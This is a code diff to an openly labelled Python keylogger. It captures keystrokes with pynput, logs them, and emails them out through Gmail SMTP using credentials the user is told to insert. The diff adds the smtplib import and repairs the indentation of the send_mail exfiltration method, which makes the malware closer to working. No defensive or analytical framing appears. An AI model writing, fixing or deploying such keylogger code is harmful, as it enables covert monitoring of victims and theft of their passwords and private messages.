@@ -9,6 +9,7 @@ Delivery Method: Change line 49 to your email/password
 from pynput.keyboard import Key, Listener
 import logging
 import os
+import smtplib
 from datetime import datetime
 
 print('******'* 5)
@@ -25,7 +26,7 @@ class Keylogger:
             os.mkdir(sub_dir)
     
     
-    @staticmethod
+    #staticmethod
     def on_press(key):
         try:
             logging.info(str(key))
@@ -46,7 +47,7 @@ class Keylogger:
         with Listener(on_press=self.on_press) as listener:
             listener.join()
           
-        def send_mail(self, email, password, TO, msg):
+    def send_mail(self, email, password, TO, msg):
         with smtplib.SMTP("smtp.gmail.com", 587) as server:
             try:
                 server.starttls()    # enable secure TLS mode
